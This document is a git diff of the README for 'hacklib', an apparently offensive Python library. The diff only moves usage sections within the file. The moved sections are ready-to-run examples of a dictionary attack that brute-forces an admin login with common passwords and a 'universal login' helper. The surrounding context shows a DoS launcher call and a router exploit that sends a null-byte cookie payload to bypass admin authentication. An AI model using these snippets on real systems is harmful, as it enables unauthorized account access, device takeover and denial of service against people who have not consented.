@@ -15,6 +15,39 @@ dos = hacklib.DOSer()
 dos.launch('127.0.0.1', duration=30, threads=50)
 ```
 -
+Universal Login for almost all HTTP/HTTPS form-based logins and HTTP Basic Authentication logins:
+
+```python
+import hacklib
+
+ac = hacklib.AuthClient()
+# Logging into a gmail account
+htmldata = ac.login('https://gmail.com', 'email', 'password')
+
+# Returns HTML whether login works or not.
+# If resulting URL is the same, assumes failure and returns False.
+if htmldata and 'Inbox' in htmldata:
+    print 'Login Success'
+
+# For logins using HTTP Basic Auth, just check boolean:
+#if htmldata:
+#    print 'Login Success'
+```
+Simple Dictionary Attack using AuthClient:
+```python
+import hacklib
+
+ac = hacklib.AuthClient()
+# Get the top 100 most common passwords
+passwords = hacklib.topPasswords(100)
+
+for p in passwords:
+    htmldata = ac.login('http://yourwebsite.com/login', 'admin', p)
+    if htmldata and 'welcome' in htmldata.lower():
+        print 'Password is', p
+        break
+```
+-
 Port Scanning:
 ```python
 from hacklib import *
@@ -55,39 +88,6 @@ Cookie: C107351277=BBBBBBBBBBBBBBBBBBBB\x00''' + '\r\n\r\n'
 >>> hacklib.send('192.168.1.1', 80, payload)
 # The cookie replaced the firmware's memory allocation for web authentication with a null bye.
 # The router's admin page is now fully accessible from any web browser.
-```
--
-Universal Login for almost all HTTP/HTTPS form-based logins and HTTP Basic Authentication logins:
-
-```python
-import hacklib
-
-ac = hacklib.AuthClient()
-# Logging into a gmail account
-htmldata = ac.login('https://gmail.com', 'email', 'password')
-
-# Returns HTML whether login works or not.
-# If resulting URL is the same, assumes failure and returns False.
-if htmldata and 'Inbox' in htmldata:
-    print 'Login Success'
-
-# For logins using HTTP Basic Auth, just check boolean:
-#if htmldata:
-#    print 'Login Success'
-```
-Simple Dictionary Attack using AuthClient:
-```python
-import hacklib
-
-ac = hacklib.AuthClient()
-# Get the top 100 most common passwords
-passwords = hacklib.topPasswords(100)
-
-for p in passwords:
-    htmldata = ac.login('http://yourwebsite.com/login', 'admin', p)
-    if htmldata and 'welcome' in htmldata.lower():
-        print 'Password is', p
-        break
 ```
 -
 FTP Authentication:
